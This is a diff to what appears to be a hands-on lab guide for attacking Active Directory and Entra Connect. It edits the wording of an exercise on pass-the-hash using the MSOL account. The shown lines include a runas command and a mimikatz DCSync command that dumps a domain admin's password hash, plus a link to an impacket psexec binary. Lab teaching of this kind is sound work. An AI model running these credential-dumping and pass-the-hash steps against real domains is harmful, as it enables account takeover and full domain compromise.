@@ -219,7 +219,7 @@ Get-MgUser
 #
 ### 6. Pass The Hash using Entra Connect's MSOL Account Attack
 
-Your goal: using the MSOL account creds, perform pass the hash attack, and open cmd.exe on DC VM, using another domain admin user (that is *not* ``user1``). Do it from **Win 11 VM**.
+Your goal: **using the already-obtained MSOL account creds**, perform pass the hash attack, and open cmd.exe on DC VM, using another domain admin user (that is *not* ``user1``). Do it from **Win 11 VM**.
 
 * Use ``c:\lab\mimikatz`` and [impacket-psexec](https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe)
 
@@ -237,7 +237,7 @@ Get-ADGroupMember 'domain admins' | select name,samaccountname
 # login in the context of MSOL account
 runas /user:YOUDOMAIN\MSOL_xxxxxx cmd.exe
 
-# dump rootuser's hash
+# in the newly opened cmd (running in the context of MSOL user) dump rootuser's hash (rootuser is a domain admin)
 C:\lab\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:rootuser"
 
 # from a new cmd:
